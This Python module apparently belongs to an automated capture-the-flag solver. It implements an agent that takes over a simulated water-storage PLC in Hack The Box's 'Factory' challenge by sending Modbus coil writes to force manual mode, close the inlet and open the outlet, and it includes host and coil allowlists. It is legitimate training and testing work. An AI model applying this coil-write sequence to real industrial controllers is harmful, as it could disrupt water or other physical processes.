"""Industrial control system challenge specialist.

The first deterministic playbook targets a water-storage PLC exposed through
the text-to-Modbus RTU relay used by Hack The Box's Factory challenge.  The
playbook is deliberately evidence gated: it sends writes only when the
challenge metadata and supplied artifact names identify that exact process.
"""

from __future__ import annotations

import json
import re
import socket
import struct
import time
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Tuple
from urllib.parse import urlparse

from agents.base_agent import AgentType, BaseAgent
from agents.registry import AgentRegistry
from core.utils.flag_utils import find_first_flag
from core.utils.security import SecurityPolicyError, assert_host_allowed


@AgentRegistry.register(order=92)
class IndustrialControlAgent(BaseAgent):
    """Specialist for bounded PLC, HMI, and industrial-protocol challenges."""

    MAX_RESPONSE_BYTES = 64 * 1024
    CONNECT_ATTEMPTS = 15
    CONNECT_RETRY_SECONDS = 1.0
    SOCKET_TIMEOUT_SECONDS = 5.0

    FACTORY_SLAVE = 82
    FACTORY_COILS = {
        "manual_mode_control": 9947,
        "start": 33,
        "cutoff_in": 26,
        "force_start_out": 52,
    }

    def __init__(
        self,
        agent_id: str = "ics_agent",
        connector: Optional[Callable[..., socket.socket]] = None,
        sleeper: Callable[[float], None] = time.sleep,
    ):
        super().__init__(agent_id, AgentType.SPECIALIST)
        self._connector = connector or socket.create_connection
        self._sleep = sleeper
        self.capabilities = [
            "ics",
            "industrial_control_systems",
            "plc_ladder_logic",
            "hmi_recovery",
            "modbus_rtu",
            "modbus_coil_writes",
            "process_state_verification",
        ]

    def analyze_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        text = self._challenge_text(challenge)
        indicators: List[str] = []
        if str(challenge.get("category") or "").lower() in {"ics", "ot"}:
            indicators.append("ics_category")
        if re.search(
            r"\b(?:ics|scada|plc|hmi|industrial control|operational technology)\b",
            text,
        ):
            indicators.append("industrial_control_terms")
        if re.search(r"\b(?:modbus|ladder logic|coil|serial network)\b", text):
            indicators.append("plc_protocol_terms")
        if self._is_factory_profile(challenge):
            indicators.append("factory_water_storage_profile")

        can_handle = bool(indicators)
        return {
            "agent_id": self.agent_id,
            "can_handle": can_handle,
            "confidence": (
                0.99
                if "factory_water_storage_profile" in indicators
                else (0.92 if can_handle else 0.1)
            ),
            "detected_types": indicators,
            "approach": self._plan_approach(indicators),
        }

    def solve_challenge(self, challenge: Dict[str, Any]) -> Dict[str, Any]:
        steps = ["Analyzed ICS process evidence and supplied PLC artifacts."]
        if not self._is_factory_profile(challenge):
            steps.append(
                "No supported evidence-gated ICS playbook matched; no PLC writes were sent."
            )
            return self._result(challenge, steps=steps)

        endpoint = self._remote_endpoint(challenge)
        if endpoint is None:
            steps.append("Factory evidence matched, but no TCP target was provided.")
            return self._result(challenge, steps=steps)
        host, port = endpoint

        try:
            assert_host_allowed(host, port=port)
            with self._connect_with_retry(host, port) as sock:
                banner = self._recv_until(sock, b"Select:")
                if b"Water Storage Facility Interface" not in banner:
                    raise ValueError("target did not present the expected Factory relay banner")
                initial = self._get_status(sock)
                if not self._is_factory_status(initial):
                    raise ValueError("target did not return the expected Factory PLC status schema")
                steps.append(
                    "Validated the Factory text relay and read the initial PLC process state."
                )

                self._send_coil(sock, "manual_mode_control", True)
                self._send_coil(sock, "start", True)
                manual = self._get_status(sock)
                if manual.get("auto_mode") != 0 or manual.get("manual_mode") != 1:
                    raise ValueError(
                        "PLC did not enter manual mode after the documented enable/start sequence"
                    )
                steps.append(
                    "Switched the PLC from automatic to manual control and verified the transition."
                )

                self._send_coil(sock, "cutoff_in", True)
                self._send_coil(sock, "force_start_out", True)
                final = self._get_status(sock)
                if not (
                    final.get("manual_mode") == 1
                    and final.get("stop_in") == 1
                    and final.get("in_valve") == 0
                    and final.get("out_valve") == 1
                ):
                    raise ValueError("PLC did not reach the verified drain-safe state")
                steps.append(
                    "Closed the inlet, opened the outlet, and verified the drain-safe state."
                )

                flag = find_first_flag(str(final.get("flag") or ""))
                if not flag:
                    steps.append(
                        "The process reached the target state, but the status response had no flag."
                    )
                    return self._result(
                        challenge,
                        steps=steps,
                        artifacts={"final_state": self._redacted_state(final)},
                        techniques=["ladder_logic_state_analysis", "modbus_single_coil_write"],
                    )
                steps.append("Recovered a flag from the verified final PLC status response.")
                return self._result(
                    challenge,
                    steps=steps,
                    flag=flag,
                    techniques=[
                        "ics_mode_switching",
                        "ladder_logic_state_analysis",
                        "modbus_single_coil_write",
                    ],
                )
        except (OSError, SecurityPolicyError, TypeError, ValueError) as exc:
            steps.append(f"ICS solve stopped safely: {exc}")
            return self._result(challenge, steps=steps)

    def get_capabilities(self) -> List[str]:
        return self.capabilities

    def _connect_with_retry(self, host: str, port: int):
        last_error: Optional[OSError] = None
        for attempt in range(self.CONNECT_ATTEMPTS):
            try:
                return self._connector((host, port), timeout=self.SOCKET_TIMEOUT_SECONDS)
            except OSError as exc:
                last_error = exc
                if attempt + 1 < self.CONNECT_ATTEMPTS:
                    self._sleep(self.CONNECT_RETRY_SECONDS)
        raise last_error or ConnectionError("could not connect to ICS target")

    def _get_status(self, sock: socket.socket) -> Dict[str, Any]:
        sock.sendall(b"1\n")
        response = self._recv_until(sock, b"Select:")
        match = re.search(rb"\{[^\r\n]{1,8192}\}", response)
        if not match:
            raise ValueError("status response did not contain a bounded JSON object")
        status = json.loads(match.group(0).decode("utf-8"))
        if not isinstance(status, dict):
            raise ValueError("status response was not a JSON object")
        return status

    def _send_coil(self, sock: socket.socket, name: str, enabled: bool) -> None:
        if name not in self.FACTORY_COILS:
            raise ValueError(f"coil {name!r} is not in the Factory allowlist")
        sock.sendall(b"2\n")
        prompt = self._recv_until(sock, b"Modbus command:")
        if b"Modbus command:" not in prompt:
            raise ValueError("target did not present the Modbus command prompt")
        packet = self.build_write_single_coil(
            self.FACTORY_SLAVE,
            self.FACTORY_COILS[name],
            enabled,
        )
        sock.sendall(packet.encode("ascii") + b"\n")
        response = self._recv_until(sock, b"Select:")
        if b"Modbus command sent to the network!" not in response:
            raise ValueError(f"target did not acknowledge the {name} coil write")

    def _recv_until(self, sock: socket.socket, marker: bytes) -> bytes:
        sock.settimeout(0.4)
        data = bytearray()
        deadline = time.monotonic() + self.SOCKET_TIMEOUT_SECONDS
        while len(data) < self.MAX_RESPONSE_BYTES and time.monotonic() < deadline:
            try:
                chunk = sock.recv(min(4096, self.MAX_RESPONSE_BYTES - len(data)))
            except socket.timeout:
                continue
            if not chunk:
                break
            data.extend(chunk)
            if marker in data:
                break
        if len(data) >= self.MAX_RESPONSE_BYTES:
            raise ValueError("ICS response exceeded the configured byte limit")
        return bytes(data)

    @staticmethod
    def build_write_single_coil(slave: int, address: int, enabled: bool) -> str:
        """Build a six-byte Modbus RTU FC05 request without its gateway-added CRC."""
        if not 0 <= int(slave) <= 0xFF:
            raise ValueError("Modbus slave must fit in one byte")
        if not 0 <= int(address) <= 0xFFFF:
            raise ValueError("Modbus coil address must fit in two bytes")
        value = 0xFF00 if enabled else 0x0000
        return struct.pack(">BBHH", int(slave), 0x05, int(address), value).hex()

    @classmethod
    def _is_factory_profile(cls, challenge: Dict[str, Any]) -> bool:
        text = cls._challenge_text(challenge)
        files = {Path(str(item)).name.lower() for item in challenge.get("files", [])}
        name_match = str(challenge.get("name") or "").strip().lower() == "factory"
        process_match = all(term in text for term in ("water", "plc", "serial"))
        artifact_match = {"interface_setup.png", "plc_ladder_logic.pdf"}.issubset(files)
        return (name_match and process_match) or (process_match and artifact_match)

    @staticmethod
    def _challenge_text(challenge: Dict[str, Any]) -> str:
        return " ".join(
            [
                str(challenge.get("name") or ""),
                str(challenge.get("description") or ""),
                " ".join(str(item) for item in challenge.get("hints", [])),
                " ".join(str(item) for item in challenge.get("tags", [])),
            ]
        ).lower()

    @staticmethod
    def _remote_endpoint(challenge: Dict[str, Any]) -> Optional[Tuple[str, int]]:
        for raw in (
            challenge.get("url"),
            challenge.get("target"),
            challenge.get("connection_info"),
            challenge.get("remote"),
        ):
            if isinstance(raw, dict):
                host = raw.get("host") or raw.get("hostname")
                port = raw.get("port")
                if host and str(port).isdigit() and 1 <= int(port) <= 65535:
                    return str(host), int(port)
                raw = raw.get("url")
            value = str(raw or "").strip()
            if not value:
                continue
            parsed = urlparse(value if "://" in value else f"tcp://{value}")
            try:
                port = parsed.port
            except ValueError:
                continue
            if parsed.hostname and port and 1 <= port <= 65535:
                return parsed.hostname, port
        return None

    @staticmethod
    def _is_factory_status(status: Dict[str, Any]) -> bool:
        required = {"auto_mode", "manual_mode", "stop_in", "in_valve", "out_valve", "flag"}
        return required.issubset(status)

    @staticmethod
    def _redacted_state(status: Dict[str, Any]) -> Dict[str, Any]:
        return {key: value for key, value in status.items() if key != "flag"}

    def _result(
        self,
        challenge: Dict[str, Any],
        *,
        steps: List[str],
        flag: Optional[str] = None,
        artifacts: Optional[Dict[str, Any]] = None,
        techniques: Optional[List[str]] = None,
    ) -> Dict[str, Any]:
        return {
            "challenge_id": challenge.get("id"),
            "agent_id": self.agent_id,
            "status": "solved" if flag else "attempted",
            "flag": flag,
            "steps": steps,
            "techniques": techniques or [],
            "artifacts": artifacts or {},
        }
